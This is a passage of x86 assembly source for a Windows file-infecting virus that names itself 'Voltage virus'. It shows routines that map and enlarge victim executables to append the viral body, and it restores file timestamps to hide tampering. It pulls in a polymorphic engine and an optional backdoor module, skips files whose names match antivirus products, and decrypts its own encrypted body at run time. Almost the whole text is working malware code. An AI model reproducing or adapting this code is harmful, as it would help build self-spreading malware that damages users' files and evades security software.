RestoreFileSize:
	push	FILE_BEGIN
	push	0h
	push	dword ptr [ebp + FileSize]
	push	dword ptr [ebp + hfile]
	call	[ebp + SetFilePointer]
	push	dword ptr [ebp + hfile]
	call	[ebp + SetEndOfFile]
	ret
	
CloseFile:
	push	dword ptr [ebp + mapbase]
	call	[ebp + UnMapViewOfFile]
	push	dword ptr [ebp + hmap]
	call	[ebp + CloseHandle]
	lea	eax,[ebp + LastWriteTime]
	push	eax
	lea	eax,[ebp + LastAccessTime]
	push	eax
	lea	eax,[ebp + CreationTime]
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + SetFileTime]
	push	dword ptr [ebp + hfile]
	call	[ebp + CloseHandle]
	ret
	
OpenFile:
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	OpenFileErr
	mov	dword ptr [ebp + hfile],eax
	lea	eax,[ebp + LastWriteTime]
	push	eax
	lea	eax,[ebp + LastAccessTime]
	push	eax
	lea	eax,[ebp + CreationTime]
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + GetFileTime]
	xor	eax,eax
	push	eax
	push	dword ptr [ebp + FileSize]
	add	dword ptr [esp],VirusSize
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	je	FileSizeErr
	mov	dword ptr [ebp + hmap],eax
	push	dword ptr [ebp + FileSize]
	add	dword ptr [esp],VirusSize
	xor	eax,eax
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hmap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	MapFileErr
	mov	dword ptr [ebp + mapbase],eax
	stc
	ret
MapFileErr:
	push	dword ptr [ebp + hmap]
	call	[ebp + CloseHandle]
FileSizeErr:
	push	dword ptr [ebp + hfile]
	call	[ebp + CloseHandle]
OpenFileErr:
	clc
	ret

	include polyengine.asm
	
	FileSize	dd	0
	hfile		dd	0
	hmap		dd	0
	mapbase		dd	0
	
	CreationTime		dq	0
	LastAccessTime		dq	0
	LastWriteTime		dq	0
	
	
IF	DEBUG
	warning	db	"Warning!!!:Voltage virus is going to infect this file,press yes to infect",0
ENDIF
	
	FILE_ATTRIBUTE_NORMAL	equ	00000080h
	OPEN_EXISTING	equ	3
	GENERIC_READ	equ	80000000h
	GENERIC_WRITE	equ	40000000h
	INVALID_HANDLE_VALUE	equ	-1
	PAGE_READWRITE	equ	4h
	FILE_MAP_WRITE	equ	00000002h
	FILE_BEGIN	equ	0
	MB_YESNO	equ	00000004h
	IDYES	equ	6
	
;eax - file size
pad_size:
	push	eax
	xor	edx,edx
	mov	ecx,65h	;101d
	div	ecx
	cmp	edx,0h
	je	no_pad
	sub	ecx,edx
	xchg	ecx,edx
no_pad:	pop	eax
	add	eax,edx
	ret


IF	BACKDOOR

include backdoor.asm

ENDIF
	
;check if file is related to av programs or canot be infected
;input:
;esi - file name
;output:
;carry flag

CheckFileName:
	lea	esi,[ebp + FileToInfect]
	xor	ecx,ecx
@checkV:cmp	byte ptr [esi + ecx],'v'
	je	badfile
	cmp	byte ptr [esi + ecx],'V'
	je	badfile
	cmp	byte ptr [esi + ecx],0h
	je	no_v
	inc	ecx
	jmp	@checkV
no_v:	push	esi			;save file name for later use
	mov	ecx,TwoBytesNames	;scan for 2 bytes bad name
	lea	edi,[ebp + DontInfectTable]
l2:	mov	bx,word ptr [edi]
l2_1:	mov	ax,word ptr [esi]
	cmp	ax,bx
	je	ex_rs
	add	bx,2020h
	cmp	ax,bx
	je	ex_rs
	sub	bx,2020h
	inc	esi
	cmp	byte ptr [esi],0h
	jne	l2_1
	mov	esi,[esp]		;restore file name	
	add	edi,2h
	loop	l2
	mov	ecx,FourBytesNames	;scan for 4 bytes bad name
	lea	edi,[ebp + DontInfectTable + (2*TwoBytesNames)]
	mov	esi,[esp]		;get file name
l3:	mov	ebx,dword ptr [edi]
l3_1:	mov	eax,dword ptr [esi]
	cmp	eax,ebx
	je	ex_rs
	add	ebx,20202020h
	cmp	eax,ebx
	je	ex_rs
	sub	ebx,20202020h
	inc	esi
	cmp	byte ptr [esi],0h
	jne	l3_1
	mov	esi,[esp]
	add	edi,4h
	loop	l3
	pop	esi
	stc
	ret
ex_rs:	pop	esi
badfile:clc
	ret
	
DontInfectTable:

	db	"FP"
	db	"TB"
	db	"AW"
	db	"DR"
	db	"F-"
	TwoBytesNames	equ	5
	db	"INOC"
	db	"PAND"
	db	"ANTI"
	db	"AMON"
	db	"N32S"
	db	"NOD3"
	db	"NPSS"
	db	"SMSS"
	db	"SCAN"
	db	"ZONE"
	db	"PROT"
	db	"MONI"
	db	"RWEB"
	db	"MIRC"
	db	"CKDO"
	db	"TROJ"
	db	"SAFE"
	db	"JEDI"
	db	"TRAY"		
	db	"ANDA"	
	db	"SPID"		
	db	"PLOR"
	db	"NDLL"		
	db	"TREN"
	db	"NSPL"
	db	"NSCH"
	db	"SYST"		;dont infect files in system directory
	db	"ALER"
	
	FourBytesNames	equ	28
		

	GPTR			equ	0040h
	FILE_ATTRIBUTE_NORMAL	equ	00000080h
	FILE_ATTRIBUTE_READONLY	equ	00000001h
	FILE_ATTRIBUTE_HIDDEN	equ	00000002h
	FILE_ATTRIBUTE_SYSTEM	equ	00000004h
	FILE_MAP_READ		equ	00000004h
	OPEN_EXISTING		equ	3
	CREATE_ALWAYS           equ     2
	OPEN_ALWAYS		equ	4
	FILE_SHARE_READ		equ	00000001h
	GENERIC_READ		equ	80000000h
	PAGE_READONLY		equ	00000002h
	HKEY_CLASSES_ROOT	equ	80000000h
	HKEY_CURRENT_USER	equ	80000001h
	REG_SZ			equ	1h
	KEY_WRITE		equ	00020006h
	KEY_READ		equ	00020019h
	KEY_QUERY_VALUE		equ	0001h
	ERROR_SUCCESS		equ	0h
	FILE_CURRENT		equ	1
	PAGE_READWRITE          equ	4
	hkey		dd	0


get_apis:
;ecx - number of apis
;eax - address to api strings
;ebx - address to api address
;edx - module handle
NextAPI:
	push	ecx
	push	edx
	push	eax
	push	eax
	push	edx
	call	[ebp + __GetProcAddress]
	cmp	eax,0h
	je	ApiErr
	mov	dword ptr [ebx],eax
	pop	eax
NextSTR:inc	eax
	cmp	byte ptr [eax],0h
	jne	NextSTR
	inc	eax
	add	ebx,4h
	pop	edx
	pop	ecx
	loop	NextAPI
	stc
	ret
ApiErr:	add	esp,0ch
	clc
	ret


	EncryptedVirusEnd	equ	$
	
DecryptVirus:
	mov	esi,[esp]		;get return address
	mov	ecx,EncryptedVirus	;size of encrypted virus
	mov	edx,12345678h
	SlidingKey	equ	$-4
decrypt:rol	edx,1h
	xor	byte ptr [esi],0h
	XorKey	equ	($-1)
	add	byte ptr [esi],dl
	inc	esi
	loop	decrypt
	ret


	db	60h	dup(?)		;padding
	VirusEnd	equ	$
	
	

FirstGenHost:
IF	SEC_CHECK
	push	OF_READ
	call	OverF
	db	"c:\not_me.txt",0
OverF:	call	_lopen
	cmp	eax,0FFFFFFFFh					;dont run virus if this file exist
	je	JmpVirs
	ret
JmpVirs:
ENDIF	
	mov	ebp,VirusSize
	xor	ebp,ebp						;first generation delta offset
	push	offset Exit		
	pushad
	jmp	VirusStart
Exit:	nop
_exit:	push	eax
	call	[ExitProcess]
FakeHost:
	push	0FFFFFFFFh
	call	[Sleep]
	

	OF_READ	equ	0             

end FirstGenHost
